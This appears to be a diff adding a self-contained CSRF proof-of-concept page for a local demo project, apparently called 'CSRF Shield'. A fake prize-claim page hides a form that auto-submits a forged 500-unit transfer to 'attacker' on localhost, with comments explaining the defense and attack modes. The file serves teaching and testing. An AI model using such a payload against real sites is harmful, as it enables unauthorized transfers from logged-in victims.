@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Free Prize Claim (definitely not suspicious)</title>
+    <style>
+        body { font-family: sans-serif; background: #111; color: #eee; text-align: center; padding: 60px; }
+        h1 { color: #f5a623; }
+    </style>
+</head>
+<body>
+<h1>🎉 Congratulations! You've won a prize! 🎉</h1>
+<p>Just sit tight while we claim it for you...</p>
+
+<!--
+  This is a self-contained CSRF proof-of-concept for the CSRF Shield project.
+  Host this file on ANY different origin than the CSRF Shield app, e.g.:
+      cd malicious-site && python3 -m http.server 9000
+  then open http://localhost:9000 in the SAME browser where you are logged
+  into CSRF Shield at http://localhost:8080.
+
+  If CSRF Shield is in DEFENSE mode, the request below is rejected (Origin
+  check + missing/invalid CSRF token + SameSite=Strict cookies). If it's in
+  ATTACK mode, the checks are bypassed server-side and cookies are reissued
+  with SameSite=None so the browser will actually attach them to this
+  cross-origin request -- the transfer will silently succeed.
+-->
+<form id="csrfForm" action="http://localhost:8080/transfer" method="POST">
+    <input type="hidden" name="toAccount" value="attacker">
+    <input type="hidden" name="amount" value="500">
+</form>
+
+<script>
+    // Auto-submits with no user interaction, hidden in a real attack
+    // (here it's visible + logged to console purely for the demo).
+    console.log("Auto-submitting forged transfer request to http://localhost:8080/transfer ...");
+    document.getElementById('csrfForm').submit();
+</script>
+</body>
+</html>
